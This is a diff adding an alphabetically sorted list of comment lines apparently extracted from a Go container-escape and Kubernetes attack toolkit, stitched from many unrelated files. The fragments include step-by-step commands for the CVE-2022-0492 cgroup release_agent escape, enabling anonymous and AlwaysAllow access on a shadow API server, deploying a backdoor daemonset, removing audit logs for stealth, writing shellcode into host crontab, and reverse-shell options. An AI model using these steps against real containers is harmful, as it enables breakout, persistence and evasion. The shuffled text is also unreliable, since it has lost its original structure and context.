@@ -1,0 +1,462 @@
+"//		CustomMsg: ""gid_map setgroups failed"","
+"//		CustomMsg: ""set gid_map failed"","
+"//		CustomMsg: ""set uid_map failed"","
+"//		Err:       err,"
+"//		fmt.Println(""recover from panic:"", r)"
+"//	fmt.Println(""skip"", currentPath)"
+"//	log.Println(""exploit failed"")"
+"//	log.Println(""exploit success."")"
+"//	println(""skip ln:"", path)"
+"//
+"// 	json = argInsertReg.ReplaceAllString(json, `${1}""--anonymous-auth=true"",${2}`)"
+"// 	json = argInsertReg.ReplaceAllString(json, `${1}""--insecure-bind-address=0.0.0.0"",${2}`)"
+"// 	json = argInsertReg.ReplaceAllString(json, `${1}""--insecure-port=9443"",${2}`)"
+"// 	p = convert.Translate(p[:m], ""utf-8"")"
+"// 	return len(p), err"
+"// 	return m, err"
+"// 	t.Errorf((""parse cdk main failed, name: %s, args: %v, buf: %s, out: %s""), tt.name, tt.args, buf.String()[:1000], string(out)[:1000])"
+"//     call must first be denied by writing ""deny"" to the"
+"//   hence, the only available cgroup is RDMA"
+"//   sh -c ""echo \$\$ > /mnt/cgrp1/x/cgroup.procs"""
+"//  +  In the case of gid_map, use of the setgroups(2) system"
+"//  We can not check the sysctl file in other distros, test in CentOS Linux release 8.4.2105 (Core)."
+"//  the sysctl files(/proc/sys/kernel/unprivileged_userns_clone) only exist in Debian, Ubuntu."
+"// ""io/ioutil"""
+"// +build !no_abuse_unpriv_userns,linux"
+"// +build !no_lxcfs_rw,linux"
+"// +build !no_mount_cgroup,linux"
+"// +build !thin,!no_containerd_shim_pwn"
+"// +build !thin,!no_containerd_shim_pwn,!no_k8s_shadow_apiserver,linux"
+"// +build !thin,!no_k8s_shadow_apiserver"
+"// +build !thin,!no_netcat_tool"
+"// +build !thin,!no_vi_tool"
+"// +build linux,!no_cap_dac_read_search"
+"// - check `/etc/mtab` for host_path: ` export host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` `"
+"// - check `/proc/self/cgroup` for cgroup, select one under root, since release_agent is writable only in root cgroup."
+"// - create new process, add to new corresponding namespace, then exit."
+"// - run a container with `--security-opt seccomp=unconfined --security-opt apparmor=unconfined` using docker, make sure the user inside container is root."
+"// - set host `sysctl -w kernel.unprivileged_userns_clone=1`, which is default after linux 5.10 for most distros"
+"// ./cdk run lxcfs-rw ""filter-string"""
+"// 2346 2345 0:261 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw"
+"// ANSI escape code in output, reg can not match it"
+"// All 1-bits, as many as letterIdxBits"
+"// But more precisely, check if any root cgroup is preferred."
+"// Can not call cli.Args here, because it will cause ""import cycle""."
+"// Device: filesystem-specific information or ""none""."
+"// Example: Run ""kubectl version --client"""
+"// Fstype: the filesystem type in the form ""type[.subtype]""."
+"// If this is not working, we have to let this process sleep and"
+"// Invalid value: \""-shadow\"": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"",""reason"":""Invalid"",""details"":{""name"":""kube-apiserver-10.206.0.11-shadow"",""kind"":""Pod"",""causes"":[{""reason"":""FieldValueInvalid"",""message"":""Invalid value: \""-shadow\"": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"",""field"":""metadata.labels""}]},""code"":422}"
+"// Note: Do not include any empty line at the start of script, or it will fail."
+"// Port 6443/https is requested by default. If the token is valid, the function return."
+"// RFC 2518, 10.1"
+"// RFC 3229, 10.4.1"
+"// RFC 4918, 11.1"
+"// RFC 5842, 7.1"
+"// RFC 7231, 6.2.1"
+"// RFC 7231, 6.2.2"
+"// RFC 7231, 6.3.1"
+"// RFC 7231, 6.3.2"
+"// RFC 7231, 6.3.3"
+"// RFC 7231, 6.3.4"
+"// RFC 7231, 6.3.5"
+"// RFC 7231, 6.3.6"
+"// RFC 7233, 4.1"
+"// Sample ""9:devices:/docker/fc1413683c2976fa292c0b1e011224706c1ecc151bad9ceabc9cfcb8dce4ddbb"""
+"// Sample2: 1659 1605 253:1 /var/lib/kubelet/pods/cc76265f-d44d-4624-91c8-6f6812f85c7e/etc-hosts /etc/hosts rw,noatime - ext4 /dev/vda1 rw"
+"// Sample3: 52 36 0:47 / /sys/fs/cgroup/memory rw,nosuid,nodev,noexec,relatime shared:26 - cgroup cgroup rw,memory"
+"// Sample: 36 35 98:0 /mnt1 /mnt2 rw,noatime master:1 - ext3 /dev/root rw,errors=continue"
+"// When the DeployBackdoorDaemonset call fails and returns an error, it will still feedback true."
+"// [inside container] ./cdk run abuse-unpriv-newns ""touch /hacked"""
+"// and i_generation is always 0, so handle is always 0x0000000000000002"
+"// by default, use ""rdma"" for kernel 4.x - 5.13, tested on 4.19/5.16"
+"// by default, use memory cgroup."
+"// case ""windows"":"
+"// change note: anonymous-auth is not valid in k8s 1.22 and later, see https://github.com/cdk-team/CDK/issues/77"
+"// check capabilites, like getcap -r /bin"
+"// dataFromSliceOrFile returns data from the slice (if non-empty), or from the file,"
+"// differing of Linux Kernel version, 5.13+ has misc available, and RDMA not work."
+"// docopt let fok = true, so we need to check it"
+"// drop dir, only scan files"
+"// end main process, prevent to run exp twice"
+"// even in container, you should save to a writable path"
+"// exit code might not be zero, but still succeed"
+"// fix ""Flag --insecure-port has been deprecated, This flag has no effect now and will be removed in v1.24."""
+"// fmt.Print and log.Print to buffer, and check output"
+"// fmt.Printf(""[+] %s\n"", Tasks[name].Desc())"
+"// fmt.Printf(""[+] Args: %v.\n"", cli.Args[""<args>""])"
+"// fmt.Printf(""[+] Running exploit: %s.\n"", name)"
+"// fmt.Printf(util.GreenBold.Sprint(""\n[Information Gathering - System Info]\n""))"
+"// for 5.13+, use ""misc"""
+"// from v1.16 on, use apps/v1 instead of extensions/v1beta1"
+"// get ""virtblk"" device ID"
+"// get current userid,groupid for mapping"
+"// get its PID, then manually execute the following commented code."
+"// get sub string from buf, lenght is 1000"
+"// hook fmt.X to buffer, hook os.Stdout"
+"// if !bytes.Contains(buf.Bytes(), []byte(tt.successStr)) && !bytes.Contains(out, []byte(tt.successStr)) {"
+"// if !strings.Contains(json, ""--anonymous-auth"") {"
+"// if !strings.Contains(json, ""--insecure-bind-address"") {"
+"// if !strings.Contains(json, ""--insecure-port"") {"
+"// if your script needs input, handle `var lib.Args[""<args>""]` by yourself."
+"// if your script needs input, parse os.Args by yourself."
+"// init: fix ""build constraints exclude all Go files in /pkg/task"""
+"// json = reg.ReplaceAllString(json, ""${1}0.0.0.0${3}"")"
+"// json = reg.ReplaceAllString(json, ""${1}9443${3}"")"
+"// json = reg.ReplaceAllString(json, ""${1}true${3}"")"
+"// m, err := convert.conn.Read(p)"
+"// means Device is ""none"""
+"// nc needs -v and -h , parse it outside"
+"// newDevicesCgroup like ""mount -t cgroup -o devices devices /tmp/cdk_dcgroup**"""
+"// out, _ := ioutil.ReadAll(r)"
+"// param pid: 0 = self, 1 = container main process"
+"// parse url if opts.Url is """""
+"// prerequisites satisfied, move current process in new user namespace"
+"// r, w, _ := os.Pipe()"
+"// rand.Int63() generates 63 random bits, enough for letterIdxMax characters!"
+"// read /proc/self/mountinfo instead of /etc/mtab, since former one is already implemented"
+"// reason above, strace `unshare` tell you to do that."
+"// reg = regexp.MustCompile(`(""--anonymous-auth\s*?=\s*?)(.*?)("")`)"
+"// reg = regexp.MustCompile(`(""--insecure-bind-address\s*?=\s*?)(.*?)("")`)"
+"// reg = regexp.MustCompile(`(""--insecure-port\s*?=\s*?)(.*?)("")`)"
+"// sample: {""metadata"":{""name"":""kube-apiserver-ubuntu-linux-20-04-desktop"",""namespace"":""kube-system"",""uid"":""b7564d4e-3bb1-48ef-8885-3984be70f46d"" .. -> kube-apiserver-ubuntu-linux-20-04-desktop"
+"// sed ""s,$(printf '\033')\\[[0-9;]*[a-zA-Z],,g"" | grep -i ""\[CVE"" -A 10 | grep -Ev ""^\-\-$"" | sed -${E} ""s,\[CVE-[0-9]+-[0-9]+\].*,${SED_RED},g"""
+"// set uid and gid mapping, so you have all the caps required in new namespace to mount."
+"// sleep and read result, must use Wait() to avoid zombie process."
+"// split by "","" but should not be split"
+"// support input format like: username or username,username1,username2"
+"// test-poc can not delete, if we delete, will cause panic in Github Action with an unknown error"
+"// tested in ubuntu docker, only usable in cgroup v1 containers"
+"// walk starts from StartDir and match substring(AbsFilePath,<names in NameList>)"
+/*"
+//	if r := recover(); r != nil {
+//	return &errors.CDKRuntimeError{
+//	return filepath.SkipDir // skip soft link or it will run into container runtime filesystem
+//	return nil
+//	}
+//     /proc/[pid]/setgroups file (see below) before writing to
+//     gid_map.
+//   apparmor should also be disabled.
+//   https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+//   https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/
+// # of letter indices fitting in 63 bits
+// +build !no_check_ptrace
+// +build !no_deploy_webshell
+// +build !no_docker_api_pwn
+// +build !no_docker_runc
+// +build !no_docker_sock_check
+// +build !no_docker_sock_pwn
+// +build !no_etcd_get_k8s_token
+// +build !no_file_scan
+// +build !no_image_registry_brute
+// +build !no_istio_check
+// +build !no_k8s_backdoor_daemonset
+// +build !no_k8s_clusterip_mitm
+// +build !no_k8s_configmap_dump
+// +build !no_k8s_cronjob
+// +build !no_k8s_get_sa_token
+// +build !no_k8s_secret_dump
+// +build !no_kubelet_exec
+// +build !no_kubelet_var_log_escape
+// +build !no_mount_device
+// +build !no_mount_procfs
+// +build !no_probe_tool
+// +build !no_reverse_shell
+// +build !no_rewrite_cgroup_devices
+// +build !no_service_probe
+// +build no_probe_tool
+// +build thin no_netcat_tool
+// +build thin no_vi_tool
+// - RDMA sub-cgroup will be released.
+// - check result.
+// - create mountpoint `mkdir -p /mnt/cgrp1`
+// - create new namespace `unshare -UrmC bash`
+// - create subtasks cgroup `mkdir -p /mnt/cgrp1/x`
+// - mount to corresponding path `mount -t cgroup -o rdma cgroup /mnt/cgrp1`
+// - run `chmod +x /exp.sh`
+// - set notify_on_release to 1 `echo 1 > /mnt/cgrp1/x/notify_on_release`
+// - set release_agent to `${host_path}/exp.sh` `echo ${host_path}/exp.sh > /mnt/cgrp1/release_agent`
+// - write exploit code to /exp.sh in container
+// ./cdk eva 2>&1 | head
+// ./cdk ifconfig | head
+// ./cdk run k8s-psp-dump auto force-fuzz
+// ./cdk run test-poc | head
+// 1. escape privileged container
+// 2. escape --net=host
+// 3. escape docker.sock
+// 4. check k8s anonymous login
+// 4. escape mounted lxcfs
+// 6 bits to represent a letter index
+// :    -
+// ? why match those mount points?
+// APIs Ref https://github.com/AbsoZed/DockerPwn.py/blob/master/createContainer.py
+// ASLR off: /proc/sys/kernel/randomize_va_space = 0 
+// BannerContainer is the banner of CDK command line with colorful.
+// CAPStringsList cap strings with order
+// CVE-2019-5736 exploit copied from https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go
+// CallBasics is a function to call basic functions
+// Check cloud provider APIs in evaluate task
+// CheckDebugfs check if debugfs is installed
+// CheckUnpriUserNS checks if the current host enable unprivileged user namespace.
+// Colorful Bold
+// CommandAllow check command allow to run
+// Contributor: kmahyyg & neargle
+// DistinctArr distinct
+// FindDir will return the first dir's absolute path in the given path
+// FindSidFiles such as run `find /bin/. -perm -4000 -type f `
+// Fix a bug reported by the author of crossc2 on whc2021.
+// GetCgroup returns the cgroup info of the process
+// GetGateway returns the default gateway for the system.
+// IntContains check string array contains a int number
+// IsDir return if the path is a dir
+// Log all the log files in /var/log
+// MaybeSuccessfulStatuscodeList from https://www.w3.org/Protocols/HTTP/HTRESP.html
+// MountInfo
+// RFC 8297
+// ReadLines reads a whole file into memory
+// Ref https://github.com/kubernetes-client/python/blob/b79ad6837b2f5326c7dad488a64eed7c3987e856/kubernetes/README.md
+// Responding to the case of mount the lxcfs path of other containers in the target container
+// ShellExec run shell script by bash
+// String format: major:minor root mountPoint opts - Fstype device SuperBlockOptions
+// StringContains check string array contains a string
+// SuperBlockOptions: per-superblock options (see mount(2)).
+// TCP port scanner
+// TESTExploit plugin interface
+// TODO: check capabilites
+// TODO: why default flag not to use default token(conf.K8sSATokenDefaultPath)?
+// TODO: why so may null byte in the Mounts
+// The checkClose function calls close on a Closer and panics with a
+// The local token file is obtained by default.
+// ThinIgnoreTool Prompt the users that this tool is not included in the thin version.
+// [Information Gathering - Mounts]
+// [host] docker run -v /root/cdk:/cdk --rm -it --privileged ubuntu bash
+// [host] docker run -v /root/cdk:/cdk --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bash
+// [host] sysctl -w kernel.unprivileged_userns_clone=1
+// [inside container] ./cdk run mount-cgroup ps
+// add this to check if the container have device priv
+// and returns a slice of its lines.
+// apply regexp match
+// auth token
+// broken soft-link file will trigger panic in os.Stat().xxx()
+// call unshare then execute
+// cast hex address to uint32
+// check /var/log mount
+// check X-Envoy-Peer-Metadata-Id
+// check bash command available
+// check cgroup version
+// check comments of abuse_unpriv_userns.go for more details
+// check if api available
+// check if api-server allows system:anonymous request
+// check if system:anonymous can list namespaces
+// check if the current service-account can list namespaces
+// check kubelet endpoint and logs access
+// check setuid bit
+// check success string in buf and out
+// check useful linux commands in container
+// config for shadow api-server
+// config.json file /run/containerd/io.containerd.runtime.v1.linux/moby/<id>/config.json
+// containerd socket (grpc)
+// containerd-shim socket (grpc)
+// create a pod with target serviceaccount token mounted
+// create container with user cmd
+// create mountpoint
+// create sub-cgroup: task group x
+// curl --unix-socket /var/run/docker.sock http://127.0.0.1/info
+// current dir(pwd)
+// current user(id)
+// cve-2022-0492: only RDMA/MISC is available for exploit
+// default
+// default:
+// detect by /sys/fs/cgroup/cgroup.controllers
+// devicemapper fs not overlay2 below
+// do not print CVE number twice
+// docker socket (http)
+// docopt argparse start
+// drop non-pid
+// dump K8s Pod Security Policies with Anonymous
+// enable notify_on_release
+// err break
+// escape done~
+// escape shell cmd
+// example
+// example 1: workdir=/var/lib/docker/overlay2/9383b939bf4ed66b3f01990664d533f97f1cf9c544cb3f3d2830fe97136eb76f/work -> /data/docker/overlay2/f5aa028c48864dd7fefdd00230e6a6954d9292fdcc4e5f80575d186590ff6b5c
+// example 2: workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4301/work -> /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4301
+// example 3: /dev/mapper/docker-253:1-1316448-9ac38e89740bd1f1013d4060dd83f06d8035edfe80fefda72c7e5c6c44b5b10f -> /
+// exceptional case:
+// exploit interface implementation
+// exploit success
+// extract pod name
+// field containing hex gateway address (first field: 0)
+// field separator
+// find block device id
+// find current container cgroup
+// find lxcfs mount point for escape exploit
+// find pods cgroup devices path
+// find rw lxcfs
+// fix #37 https://github.com/cdk-team/CDK/issues/37
+// format net.IP to dotted ipV4 string
+// format: mountID parentID major:minor root mountPoint opts - Fstype device SuperBlockOptions
+// former Part
+// found
+// from https://github.com/mzet-/linux-exploit-suggester
+// from https://man7.org/linux/man-pages/man5/proc.5.html
+// from https://stackoverflow.com/questions/40682760/what-syscall-method-could-i-use-to-get-the-default-network-gateway
+// from https://stackoverflow.com/questions/5884154/read-text-file-into-string-array-and-write
+// from: https://github.com/kubernetes/kubernetes/issues/92315
+// functional codes
+// generate release_agent shell script and save to local
+// get all available exploit
+// get api-server connection conf in ENV
+// get cgroup version V1/V2
+// get container id
+// get field containing gateway address
+// get kernel version
+// get log file in kubelet endpoint
+// golang contributor think that there's no possible solution until now (2022-3).
+// golang segment fault will not trigger core dump by default.
+// grabbed from https://stackoverflow.com/questions/10485743/contains-method-for-a-slice
+// grabbed from https://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-go
+// hook os.Args
+// hostPath for write release_agent path
+// hostname
+// http client
+// http post body for Docker API exploit
+// https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+// https://docs.docker.com/engine/api/v1.24/#31-containers
+// https://elixir.bootlin.com/linux/v5.16.13/source/kernel/fork.c#L2957
+// https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492/blob/main/can-ctr-escape-cve-2022-0492.sh
+// https://github.com/golang/go/issues/12125 (not resolved yet)
+// https://github.com/golang/go/issues/22283
+// https://github.com/jiguangin/netcat
+// https://github.com/kubernetes/dns/blob/master/docs/specification.md
+// https://man7.org/linux/man-pages/man5/proc.5.html
+// https://man7.org/linux/man-pages/man7/user_namespaces.7.html
+// https://twitter.com/_fel1x/status/1151487051986087936
+// https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/
+// hybrid mode will not work in container
+// idea from https://blog.neargle.com/backup/CIS2020%20-%20Attack%20in%20a%20Service%20Mesh%20-%20Public.pdf
+// indirect
+// inode of / is always 2 for ext4: https://ext4.wiki.kernel.org/index.php/Ext4_Disk_Layout
+// iterate ip in task list
+// iterate port from A-B
+// iterate port in task list
+// jump to line containing the agteway address
+// k8s backdoor daemonset
+// k8s shadow api-server
+// kernelExploitSuggester
+// kubectl --server=https://<node-hostname>:9444/ --token=<token> --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A
+// latter part
+// line containing the gateway addr. (first line: 0)
+// linux-exploit-suggester.sh - a script to suggest possible exploits for a given Linux kernel version
+// lock down the context
+// loop through all mounted devices
+// make capabilities readable
+// make direct request to api-server REST API
+// make net.IP address from uint32
+// make sure env GOTRACEBACK=crash was set
+// make target symbolic file link
+// manual exploit:
+// match ENV to find useful service
+// match local file path to find sensitive file
+// match pod name in selfLink
+// match process name to find useful service
+// mkdir
+// mkdir and mount
+// modified due to limitation of `unshare` syscall in linux
+// more specifically: https://github.com/golang/go/issues/50098
+// mount
+// mount cgroup
+// mountID = fields[0] ; parentID = fields[1]
+// need to set `export GOTRACEBACK=crash` first
+// needs to be different in each exploit
+// oldStdout := os.Stdout
+// only return one pod
+// or /proc/filesystems
+// or an error if an error occurred reading the file
+// or directly try to mount cgroup2 with none
+// or use c codes instead to trigger crash
+// os.Stdout = oldStdout
+// os.Stdout = w
+// os/kernel version
+// others:
+// parse token
+// patch cdxy 20210413
+// patch for Tencent TKE
+// pkg/exploit/file_scan.go
+// plugin interface
+// print all device and mount them to random path under /tmp
+// print all exploit and after 10 lines
+// pull image alpine
+// read file text
+// redirect output to current tty
+// ref https://docs.docker.com/engine/api/v1.24/
+// reference something bind mounted to container from host
+// reference:
+// regex to match file text
+// register all exploits
+// register all kinds of exploits
+// register all task
+// related golang issue:
+// reload this exploit with origin args
+// remove audit logs to get stealth
+// return [true/false] when [normal exit/fatal]
+// return to os.Stdout default
+// rewrite and mknod
+// rootfs path /var/lib/docker/overlay2/<id>/merged
+// run `ln -s targetfile /var/log/targetfile`
+// run command get output
+// run linux-exploit-suggester bash script to check kernel exploit
+// run next account/username
+// runtime error if the Closer returns an error
+// same way as call unshare
+// sample:
+// scan file text to find AK/Secrets
+// send all sync objects into args
+// set --allow-privileged=true
+// set --secure-port to 9444
+// set all block device accessible
+// set anonymous-auth to true
+// set authorization-mode=AlwaysAllow
+// set insecure-port to 0.0.0.0:9443
+// set request header
+// skip executable file
+// skip large file
+// skip largefile
+// skip left side null
+// skip soft-link
+// sleep 2s for debug purpose
+// soft link ==1; hard link == 2
+// sourcecode: https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/v1.1/linux-exploit-suggester.sh
+// start actual exploit
+// start container
+// start exploit
+// step1. create Mitm Deployments
+// step2. create Mitm Services of ExternalIPs
+// stop dive if sensitive dir found
+// support for cdk eva(Evangelion) and cdk evaluate
+// support username/password list file
+// switch runtime.GOOS {
+// task interface
+// tested in ubuntu docker
+// the best way to find container id and current cgroup devices.allow
+// then execute mount-cgroup exploit with rdma subsystem
+// this is the exploit of
+// trigger core dump in crash
+// trigger release
+// try to exec shell cmd via cgroup-mount exploit
+// try to write crontab after running device-mount exploit
+// unexpect mountinfo
+// unshare can only be used in single-thread program. Golang program is always multi-thread.
+// use container abspath so runc can find config.json
+// use https://github.com/mzet-/linux-exploit-suggester to check kernel exploit
+// use kube-proxy-worker in alibaba cloud
+// use like `GreenBold.Sprint(str)`
+// use lxcfs_rw exp function by https://github.com/yeahx
+// use regexp to find gitVersion
+// version: 1.1
+// w.Close()
+// we can run fuzz anyway
+// write PID to cgroup.procs
+// write release_agent
+// write shellcode to host /etc/crontab via mounted dir
+// }
